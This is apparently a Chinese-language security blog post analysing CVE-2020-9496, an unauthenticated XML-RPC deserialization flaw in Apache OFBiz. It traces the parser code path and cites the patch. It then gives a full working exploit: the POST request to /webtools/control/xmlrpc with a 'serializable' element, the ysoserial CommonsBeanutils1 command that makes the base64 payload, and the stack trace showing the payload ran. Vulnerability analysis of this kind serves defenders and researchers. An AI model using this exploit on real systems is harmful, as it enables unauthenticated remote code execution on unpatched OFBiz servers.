---
title: CVE-2020-9496 Apache Ofbiz XMLRPC RCE漏洞分析
date: 2020-09-22 11:17:46
tags: [sec,Java,Ofbiz,XMLRPC]
categories: Security
---

<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>



## 环境搭建

- 下载：https://downloads.apache.org/ofbiz/
- 安装：在主目录下执行：
    1. `.\gradle\init-gradle-wrapper.ps1`
    2. `gradlew.bat`



## 背景

### Web路由

```xml
<!-- framework\webtools\webapp\webtools\WEB-INF\web.xml -->
<servlet>
    <description>Main Control Servlet</description>
    <display-name>ControlServlet</display-name>
    <servlet-name>ControlServlet</servlet-name>
    <servlet-class>org.apache.ofbiz.webapp.control.ControlServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
    <servlet-name>ControlServlet</servlet-name>
    <url-pattern>/control/*</url-pattern>
</servlet-mapping>
```

根据web.xml定义的`servlet`，定位到`org.apache.ofbiz.webapp.control.ControlServlet`

主要请求由`org.apache.ofbiz.webapp.control.RequestHandler#doRequest()`处理

![image-20200921163908090](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921163908090.png)

首先根据请求的url获取路由信息，默认有216个url路径（17.12.03版本）

![image-20200921164034754](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164034754.png)

之后会根据`requestMap.event`信息去查找负责处理event的handler，之后再通过`invoke`进行具体的调用，该过程由`org.apache.ofbiz.webapp.control.RequestHandler#runEvent()`来完成

![image-20200921164204132](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164204132.png)

![image-20200921164502998](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164502998.png)



### XML-RPC消息

#### XML-RPC数据类型

- 文档：https://ws.apache.org/xmlrpc/types.html

根据文档，xmlrpc支持多种数据类型，对应的xml标签包括`base64`、`struct`、`array`等

![image-20200921165252225](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921165252225.png)

下面是几种常见的数据类型

```xml
<!-- array -->
<value>
  <array>
    <data>
      <value><int>7</int></value>
    </data>
  </array>
</value>


<!-- struct -->
<struct> 
  <member> 
    <name>foo</name> 
    <value>bar</value> 
  </member> 
</struct>
```

#### XML-RPC消息格式

- 文档：http://xmlrpc.com/spec.md

每个XML-RPC请求都以`<methodCall></methodCall>`开头，该元素包含单个子元素`<methodName>method</methodName>`，元素`<methodName>`包含子元素`<params>`，`<params>`可以包含一个或多个`<param>`元素。如：

```
POST /RPC2 HTTP/1.0
User-Agent: Frontier/5.1.2 (WinNT)
Host: betty.userland.com
Content-Type: text/xml
Content-length: 181

<?xml version="1.0" encoding="utf-8"?>
<methodCall> 
  <methodName>examples.getStateName</methodName>  
  <params> 
    <param> 
      <value>
        <i4>41</i4>
      </value> 
    </param> 
  </params> 
</methodCall>
```





## 漏洞分析

CVE-2020-9496

- 漏洞信息：https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz
- 补丁：https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a

![image-20200921164745933](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164745933.png)

根据补丁发现`framework\webtools\webapp\webtools\WEB-INF\controller.xml`中的`xmlrpc`请求增加了`<security auth="true"/>`的认证，说明默认情况下该接口访问无需认证

```xml
<!-- framework\webtools\webapp\webtools\WEB-INF\controller.xml -->
<request-map uri="xmlrpc" track-serverhit="false" track-visit="false">
    <security https="false"/>
    <event type="xmlrpc"/>
    <response name="error" type="none"/>
    <response name="success" type="none"/>
</request-map>
```

### 调用方法

直接构造post请求发送

```
POST /webtools/control/xmlrpc HTTP/1.1
Host: 127.0.0.1:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Content-Length: 181

<?xml version="1.0"?>
<methodCall>
  <methodName>testMethod</methodName>
  <params>
    <param>
      <value>test</value>
    </param>
  </params>
</methodCall>
```

发现报错`org.apache.xmlrpc.server.XmlRpcNoSuchHandlerException: No such service [testMethod]`说明没有相关的方法

下断点调试一下，由上面的`org.apache.ofbiz.webapp.event.XmlRpcEventHandler#invoke()`进入`execute()`，接着调用`org.apache.xmlrpc.server.XmlRpcServer#execute()`

![image-20200921171252973](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921171252973.png)

跟入`XmlRpcServer#execute()`，发现调用了`org.apache.xmlrpc.server.XmlRpcServerWorker#execute()`，由具体的event handler处理XML-RPC请求

![image-20200921171443304](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921171443304.png)

在`org.apache.ofbiz.webapp.event.XmlRpcEventHandler.ServiceRpcHandler#getHandler()`中获取Handler对应的`ModelService`，默认注册的service有3000多个，也就是可供调用的`methodName`，如果找不到service会抛出`No such service`的异常

![image-20200921171738522](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921171738522.png)

所以此处传入一个已注册的service

回到`org.apache.xmlrpc.server.XmlRpcServerWorker#execute()`，当成功查询到service后通过`handler.execute(pRequest)`进行调用，注意此处还会检查一次`ModelService`的`export`属性，因此通过遍历serviceMap找到一个`export`为`true`的方法，如`ping`

![image-20200921172937855](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921172937855.png)

继续构造请求（下面会解释为什么需要struct块）

```
<?xml version="1.0"?>
<methodCall>
  <methodName>ping</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>foo</name>
            <value>aa</value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

响应

```xml
<?xml version="1.0" encoding="UTF-8"?><methodResponse xmlns:ex="http://ws.apache.org/xmlrpc/namespaces/extensions"><params><param><value><struct><member><name>message</name><value>PONG</value></member></struct></value></param></params></methodResponse>
```

说明成功调用ping方法



### 反序列化点

在`Ofbiz`自带的第三方库`xmlrpc-common-3.1.3.jar`中的`org.apache.xmlrpc.parser.SerializableParser`类能明显地看到对数据的还原操作，如果gadget到达此处能直接被反序列化而不会被过滤。

![image-20200921180634383](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921180634383.png)



### 解析XML

回到`org.apache.ofbiz.webapp.control.RequestHandler#runEvent()`方法，在其随后调用的链中，注意到`getRequest()`方法

```
org.apache.ofbiz.webapp.control.RequestHandler.runEvent()
  org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke()
    org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute()
      org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
```

在getRequest()中，传入的xml数据由第三方库`xmlrpc-common.jar`来进行解析（注意到此处做了XXE防护）

![image-20200921174933501](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921174933501.png)

该类的初始化由父类`org.apache.xmlrpc.parser.RecursiveTypeParserImpl`完成，顾名思义就是递归解析，其他的便是常规的xml元素解析操作，包括`startElement()`、`endElement()`等。我们知道在解析器解析xml数据的过程中，会触发到`scanDocument()`操作对元素进行逐一“扫描”，其中就会进行`startElement()`、`endElement()`的调用，这个过程如果处理不当就会引入问题。

![image-20200921181123956](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921181123956.png)

注意到在`endElement()`方法中对于`value`标签的处理，同样由父类完成，跟入`org.apache.xmlrpc.parser.RecursiveTypeParserImpl#endValueTag()`

![image-20200921181252917](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921181252917.png)

在`endValueTag()`调用了`getResult()`方法，而这个方法就是上面提到的反序列化目标方法，那么接下来就是构造xml数据发送给`Ofbiz`，如果`value`的标签中存放的值为序列化数据，那么会由`SerializableParser`类进行反序列化进而触发漏洞，调用链是这个样子的

```
org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
  org.apache.xerces.parsers.AbstractSAXParser.parse()
    org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument()
      org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement()
        org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement()
          org.apache.xmlrpc.parser.MapParser.endElement()
            org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag()
              org.apache.xmlrpc.parser.SerializableParser.getResult()
```



### PoC构造

接下来的问题就是如何构造出特定的xml数据

以上面的ping方法为例，假设post如下数据

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>ping</methodName>
  <params>
    <param>
      <value>test</value>
    </param>
  </params>
</methodCall>
```

`Ofbiz`成功解析到`endValueTag()`方法，但是由于`typeParser`属性为空，因此不会进入`getResult()`方法

![image-20200921183246986](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921183246986.png)

那么`typeParser`属性是在哪里赋值的呢？

回到`org.apache.xmlrpc.parser.XmlRpcRequestParser#startElement()`，在解析器解析xml标签时，对4类标签（methodCall、params、param、value）有分别的处理，这个处理过程是随着每次遍历标签进行的，当扫描完4个必须提供的标签后，会调用父类的`startElement()`进行处理，而typeParser就是在父类中完成赋值的，随后便通过不同的解析器进入不同的解析流程，还是会调用对应解析器的`startElement`，这个过程是递归的

![image-20200921183456809](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921183456809.png)

![image-20200921183856009](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921183856009.png)

分析扫描标签的递增过程，发现此处除了4个标签外，还需在`<value>`标签中含有额外的标签，才会进入default分支进而对`typeParser`赋值，此时struct就是一个很好的选择，它能把数据作为一个结构体传入。

接着思考如何传入序列化数据，也即如何控制后端通过`SerializableParser`解析数据

还是关注typeParser的赋值过程，这个属性就是最终将要处理不同类型数据的解析器，在`org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement()`中，注意到`factory.getParser()`操作，将由`org.apache.xmlrpc.common.TypeFactoryImpl`类获得不同数据类型的解析类，在其中就有获取`SerializableParser`的过程

![image-20200921185008145](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921185008145.png)

因此只要传入`<serializable>`标签便会由`SerializableParser`进行解析。

此时还有个前提条件，那就是标签属性必须带有`XmlRpcWriter.EXTENSIONS_URI`才会进入后续的判断流程，因此post的数据是这样子的：

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>ping</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>foo</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">serialized_data</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```



最后一步，数据的格式

在获取到`SerializableParser`解析器后，startElement过程由父类`org.apache.xmlrpc.parser.ByteArrayParser#startElement()`完成，在其中能看到base64的解码操作，所以最终的序列化数据是需要通过base64传输的

![image-20200922105244816](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200922105244816.png)

### 漏洞利用

`Ofbiz`中存在Commons-Beanutils库，所以使用ysoserial直接生成CommonsBeanutils1的payload

```
> java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 calc | base64 |tr -d "\n"
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZ...
```

填充serialized_data并发送

![image-20200921191012365](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921191012365.png)

调用链

```
java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
	at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171) ~[commons-beanutils-1.9.3.jar:1.9.3]
	at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721) ~[?:1.8.0_141]
	at java.util.PriorityQueue.siftDown(PriorityQueue.java:687) ~[?:1.8.0_141]
	at java.util.PriorityQueue.heapify(PriorityQueue.java:736) ~[?:1.8.0_141]
	at java.util.PriorityQueue.readObject(PriorityQueue.java:795) ~[?:1.8.0_141]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_141]
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_141]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_141]
	at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_141]
	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1058) ~[?:1.8.0_141]
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2136) ~[?:1.8.0_141]
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2027) ~[?:1.8.0_141]
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1535) ~[?:1.8.0_141]
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422) ~[?:1.8.0_141]
	at org.apache.xmlrpc.parser.SerializableParser.getResult(SerializableParser.java:36) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag(RecursiveTypeParserImpl.java:78) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xmlrpc.parser.MapParser.endElement(MapParser.java:185) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement(RecursiveTypeParserImpl.java:103) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement(XmlRpcRequestParser.java:165) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xerces.parsers.AbstractSAXParser.endElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.impl.XMLNSDocumentScannerImpl.scanEndElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl$FragmentContentDispatcher.dispatch(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.parsers.XMLParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest(XmlRpcEventHandler.java:285) ~[ofbiz.jar:?]
	at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute(XmlRpcEventHandler.java:229) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke(XmlRpcEventHandler.java:145) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.control.RequestHandler.runEvent(RequestHandler.java:741) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.control.RequestHandler.doRequest(RequestHandler.java:465) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.control.ControlServlet.doGet(ControlServlet.java:217) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.control.ControlServlet.doPost(ControlServlet.java:91) [ofbiz.jar:?]
```





<script>pangu.spacingPage();</script>